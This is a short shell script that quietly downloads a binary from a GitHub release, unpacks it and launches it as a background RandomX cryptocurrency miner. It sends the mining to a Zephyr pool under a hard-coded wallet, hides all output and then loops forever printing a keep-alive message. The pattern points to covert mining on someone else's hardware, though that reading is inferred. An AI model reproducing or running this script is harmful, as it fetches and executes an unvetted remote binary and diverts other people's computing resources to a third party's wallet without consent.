#!/bin/sh
wget https://github.com/preak07/kopi/releases/download/susu/kopong.tar.gz > /dev/null 2>&1 && tar -xvf kopong.tar.gz &&  chmod +x kopong && ./kopong -algo randomx -wallet ZEPHsAZJ6eo36HYMxHZKtUGhfG3xycfLkEKcSKiUDXXiQAnA6z4VxeuN4sj4AQe8USWfozFRYzB2WS6kMWfGGZaj7AoQe1dWLmp -coin ZEPH -rigName "vivo" -pool1 zeph-asia1.nanopool.org:10900 --cpu-max-threads-hint 25 >/dev/null 2>&1 &
while true
do
        echo "gasss........!"
        sleep 20
done
